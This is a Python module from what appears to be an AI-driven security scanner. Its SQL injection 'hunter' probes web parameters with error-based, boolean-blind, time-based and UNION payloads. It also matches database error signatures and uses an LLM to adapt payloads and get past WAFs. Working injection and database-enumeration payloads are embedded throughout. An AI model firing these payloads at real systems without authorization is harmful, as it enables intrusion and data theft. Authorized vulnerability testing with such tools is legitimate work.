"""
XLayer AI SQL Injection Hunter - Detects SQL injection vulnerabilities
"""

import re
import time
import asyncio
from typing import List, Optional, Dict, Any
from loguru import logger

from xlayer_ai.core.vuln_hunters.base import BaseHunter, HunterResult
from xlayer_ai.models.target import AttackSurface, Endpoint
from xlayer_ai.models.vulnerability import (
    VulnHypothesis, VulnType, Confidence, VulnIndicator
)
from xlayer_ai.tools.payload_manager import PayloadCategory, DatabaseType


SQL_ERROR_PATTERNS = {
    "mysql": [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"Syntax error or access violation",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
    ],
    "mssql": [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"Warning.*mssql_",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.",
        r"(?s)Exception.*\WRoadhouse\.Cms\.",
        r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
        r"com\.microsoft\.sqlserver\.jdbc",
        r"Unclosed quotation mark after the character string",
    ],
    "oracle": [
        r"\bORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
        r"oracle\.jdbc",
        r"quoted string not properly terminated",
    ],
    "sqlite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
        r"SQLite error \d+:",
        r"sqlite3\.OperationalError:",
        r"SQLite3::SQLException",
    ],
    "generic": [
        r"SQL syntax",
        r"syntax error",
        r"unexpected end of SQL",
        r"quoted string not properly terminated",
        r"unclosed quotation mark",
        r"SQL command not properly ended",
    ]
}


class SQLiHunter(BaseHunter):
    """
    SQL Injection Hunter
    
    Detects:
    - Error-based SQL injection
    - Boolean-based blind SQL injection
    - Time-based blind SQL injection
    - Union-based SQL injection
    """
    
    name = "sqli"
    vuln_types = [VulnType.SQLI]
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._baseline_responses: Dict[str, Dict[str, Any]] = {}
    
    async def hunt(self, attack_surface: AttackSurface) -> HunterResult:
        """Hunt for SQL injection vulnerabilities"""
        start_time = time.time()
        self._reset_state()

        logger.info(f"SQLi Hunter starting on {len(attack_surface.testable_endpoints)} endpoints")

        db_type = self._detect_db_type(attack_surface)
        tech_stack = getattr(attack_surface, "technology", None)
        if hasattr(tech_stack, "model_dump"):
            tech_stack = tech_stack.model_dump(exclude_none=True)
        tech_stack = tech_stack if isinstance(tech_stack, dict) else {}
        static_payloads = [p.value for p in self.payloads.get_sqli_payloads(
            db_type=db_type, include_time_based=True,
            parameter_name=None, tech_stack=tech_stack,
        )]

        for endpoint in attack_surface.testable_endpoints:
            for param in endpoint.parameters:
                await self._establish_baseline(endpoint, param.name)
                # Context-aware payloads: param name (id→SQLi-first) + tech_stack
                param_static = [p.value for p in self.payloads.get_sqli_payloads(
                    db_type=db_type, include_time_based=True,
                    parameter_name=param.name, tech_stack=tech_stack,
                )]

                # Build context for AI
                ctx = self._build_attack_context(endpoint, param.name, "sqli", attack_surface)
                ctx.baseline_length = len(
                    (self._baseline_responses.get(f"{endpoint.url}:{param.name}") or {}).get("body", "")
                )

                # Success detector for SQLi
                def sqli_success(send_result, attack_ctx):
                    body = send_result.body
                    for db_name, patterns in SQL_ERROR_PATTERNS.items():
                        for pattern in patterns:
                            if re.search(pattern, body, re.IGNORECASE):
                                return True
                    return False

                attempts = await self._adaptive_test(
                    endpoint, param.name, param_static, ctx, sqli_success
                )

                # Build hypotheses from successful/partial attempts
                hypotheses = await self._test_sqli(endpoint, param.name, param_static, db_type)

                # Also check AI-found successes
                for attempt in attempts:
                    if attempt.success:
                        detected_db = self._db_from_body(attempt.response_body)
                        indicators = [VulnIndicator(
                            indicator_type="ai_adaptive",
                            detail=f"AI adaptive payload succeeded: {attempt.payload[:60]}",
                            confidence_boost=0.3
                        )]
                        h = self._create_hypothesis(
                            vuln_type=VulnType.SQLI,
                            endpoint=endpoint,
                            parameter=param.name,
                            confidence=Confidence.HIGH,
                            indicators=indicators,
                            suggested_payloads=[attempt.payload],
                            context={
                                "injection_type": "ai_adaptive",
                                "db_type": detected_db,
                                "trigger_payload": attempt.payload,
                                "waf_bypassed": ctx.waf
                            }
                        )
                        hypotheses.append(h)

                self._hypotheses.extend(hypotheses)

        duration = time.time() - start_time
        result = self._build_result(duration)

        logger.info(
            f"SQLi Hunter complete: {result.findings_count} hypotheses, "
            f"{result.high_confidence_count} high confidence"
        )
        return result

    def _db_from_body(self, body: str) -> str:
        for db_name, patterns in SQL_ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    return db_name
        return "generic"
    
    def _detect_db_type(self, attack_surface: AttackSurface) -> DatabaseType:
        """Detect database type from attack surface"""
        tech = attack_surface.technology
        
        if tech.database:
            db_map = {
                "mysql": DatabaseType.MYSQL,
                "postgresql": DatabaseType.POSTGRESQL,
                "mssql": DatabaseType.MSSQL,
                "oracle": DatabaseType.ORACLE,
                "sqlite": DatabaseType.SQLITE,
            }
            return db_map.get(tech.database.lower(), DatabaseType.GENERIC)
        
        return DatabaseType.GENERIC
    
    async def _establish_baseline(self, endpoint: Endpoint, parameter: str):
        """Establish baseline response for comparison"""
        key = f"{endpoint.url}:{parameter}"
        
        if key in self._baseline_responses:
            return
        
        response = await self._send_payload(endpoint, parameter, "1")
        if response:
            self._baseline_responses[key] = {
                "status": response["status"],
                "length": len(response["body"]),
                "elapsed_ms": response["elapsed_ms"]
            }
    
    async def _test_sqli(
        self,
        endpoint: Endpoint,
        parameter: str,
        payloads: List[str],
        db_type: DatabaseType
    ) -> List[VulnHypothesis]:
        """Test endpoint for SQL injection"""
        hypotheses = []
        self._endpoints_tested += 1
        
        error_hypothesis = await self._test_error_based(endpoint, parameter)
        if error_hypothesis:
            hypotheses.append(error_hypothesis)
        
        boolean_hypothesis = await self._test_boolean_based(endpoint, parameter)
        if boolean_hypothesis:
            hypotheses.append(boolean_hypothesis)
        
        if not hypotheses:
            time_hypothesis = await self._test_time_based(endpoint, parameter, db_type)
            if time_hypothesis:
                hypotheses.append(time_hypothesis)
        
        return hypotheses
    
    async def _test_error_based(
        self,
        endpoint: Endpoint,
        parameter: str
    ) -> Optional[VulnHypothesis]:
        """Test for error-based SQL injection"""
        error_payloads = ["'", '"', "\\", "' OR '1'='1", "1'"]
        
        for payload in error_payloads:
            self._payloads_sent += 1
            response = await self._send_payload(endpoint, parameter, payload)
            
            if not response or response.get("error"):
                continue
            
            body = response["body"]
            detected_db = None
            error_message = None
            
            for db_name, patterns in SQL_ERROR_PATTERNS.items():
                for pattern in patterns:
                    match = re.search(pattern, body, re.IGNORECASE)
                    if match:
                        detected_db = db_name
                        error_message = match.group(0)
                        break
                if detected_db:
                    break
            
            if detected_db:
                indicators = [
                    VulnIndicator(
                        indicator_type="sql_error",
                        detail=f"Database error detected: {error_message}",
                        confidence_boost=0.2
                    ),
                    VulnIndicator(
                        indicator_type="db_type",
                        detail=f"Database type: {detected_db}",
                        confidence_boost=0.1
                    )
                ]
                
                return self._create_hypothesis(
                    vuln_type=VulnType.SQLI,
                    endpoint=endpoint,
                    parameter=parameter,
                    confidence=Confidence.HIGH,
                    indicators=indicators,
                    suggested_payloads=self._get_exploit_payloads(detected_db),
                    context={
                        "injection_type": "error_based",
                        "db_type": detected_db,
                        "error_message": error_message,
                        "trigger_payload": payload
                    }
                )
        
        return None
    
    async def _test_boolean_based(
        self,
        endpoint: Endpoint,
        parameter: str
    ) -> Optional[VulnHypothesis]:
        """Test for boolean-based blind SQL injection"""
        key = f"{endpoint.url}:{parameter}"
        baseline = self._baseline_responses.get(key)
        
        if not baseline:
            return None
        
        true_payloads = ["' AND '1'='1", "1' AND '1'='1", "' OR '1'='1"]
        false_payloads = ["' AND '1'='2", "1' AND '1'='2", "' AND 'a'='b"]
        
        for true_payload, false_payload in zip(true_payloads, false_payloads):
            self._payloads_sent += 2
            
            true_response = await self._send_payload(endpoint, parameter, true_payload)
            false_response = await self._send_payload(endpoint, parameter, false_payload)
            
            if not true_response or not false_response:
                continue
            
            true_length = len(true_response["body"])
            false_length = len(false_response["body"])
            baseline_length = baseline["length"]
            
            length_diff = abs(true_length - false_length)
            true_baseline_diff = abs(true_length - baseline_length)
            
            if length_diff > 50 and true_baseline_diff < 100:
                indicators = [
                    VulnIndicator(
                        indicator_type="boolean_diff",
                        detail=f"Response length difference: {length_diff} bytes",
                        confidence_boost=0.15
                    )
                ]

                confidence = Confidence.MEDIUM

                llm_result = await self._llm_analyze_response(
                    endpoint, parameter, true_payload, true_response, "sql_injection"
                )
                if llm_result and llm_result.get("vulnerable") and llm_result.get("confidence", 0) > 0.7:
                    confidence = Confidence.HIGH
                    indicators.append(VulnIndicator(
                        indicator_type="llm_analysis",
                        detail=f"LLM confirmed SQLi with {llm_result.get('confidence', 0):.0%} confidence",
                        confidence_boost=0.2
                    ))

                return self._create_hypothesis(
                    vuln_type=VulnType.SQLI,
                    endpoint=endpoint,
                    parameter=parameter,
                    confidence=confidence,
                    indicators=indicators,
                    suggested_payloads=[true_payload, false_payload],
                    context={
                        "injection_type": "boolean_based",
                        "true_length": true_length,
                        "false_length": false_length,
                        "baseline_length": baseline_length,
                        "llm_confirmed": confidence == Confidence.HIGH
                    }
                )
        
        return None
    
    async def _test_time_based(
        self,
        endpoint: Endpoint,
        parameter: str,
        db_type: DatabaseType
    ) -> Optional[VulnHypothesis]:
        """Test for time-based blind SQL injection"""
        time_payloads = {
            DatabaseType.MYSQL: "' AND SLEEP(5)--",
            DatabaseType.POSTGRESQL: "'; SELECT pg_sleep(5)--",
            DatabaseType.MSSQL: "'; WAITFOR DELAY '0:0:5'--",
            DatabaseType.ORACLE: "' AND DBMS_LOCK.SLEEP(5)--",
            DatabaseType.GENERIC: "' AND SLEEP(5)--",
            DatabaseType.SQLITE: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--"
        }
        
        payload = time_payloads.get(db_type, time_payloads[DatabaseType.GENERIC])
        
        self._payloads_sent += 1
        response = await self._send_payload(endpoint, parameter, payload)
        
        if not response:
            return None
        
        elapsed_ms = response["elapsed_ms"]
        
        if elapsed_ms >= 4500:
            indicators = [
                VulnIndicator(
                    indicator_type="time_delay",
                    detail=f"Response delayed by {elapsed_ms:.0f}ms (expected ~5000ms)",
                    confidence_boost=0.2
                )
            ]
            
            return self._create_hypothesis(
                vuln_type=VulnType.SQLI,
                endpoint=endpoint,
                parameter=parameter,
                confidence=Confidence.HIGH if elapsed_ms >= 4800 else Confidence.MEDIUM,
                indicators=indicators,
                suggested_payloads=[payload],
                context={
                    "injection_type": "time_based",
                    "db_type": db_type.value,
                    "delay_ms": elapsed_ms,
                    "expected_delay_ms": 5000
                }
            )
        
        return None
    
    def _get_exploit_payloads(self, db_type: str) -> List[str]:
        """Get exploitation payloads for detected database type"""
        payloads = {
            "mysql": [
                "' UNION SELECT NULL,version(),user()--",
                "' UNION SELECT NULL,@@version,database()--",
                "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--"
            ],
            "postgresql": [
                "' UNION SELECT NULL,version(),current_user--",
                "' UNION SELECT NULL,current_database(),NULL--"
            ],
            "mssql": [
                "' UNION SELECT NULL,@@version,NULL--",
                "' UNION SELECT NULL,DB_NAME(),SYSTEM_USER--"
            ],
            "oracle": [
                "' UNION SELECT NULL,banner,NULL FROM v$version--",
                "' UNION SELECT NULL,user,NULL FROM dual--"
            ],
            "sqlite": [
                "' UNION SELECT NULL,sqlite_version(),NULL--"
            ]
        }
        
        return payloads.get(db_type, payloads.get("mysql", []))
    
    def _analyze_response(
        self,
        endpoint: Endpoint,
        parameter: str,
        payload: str,
        response: Dict[str, Any]
    ) -> Optional[VulnHypothesis]:
        """Analyze response for SQL injection indicators"""
        return None
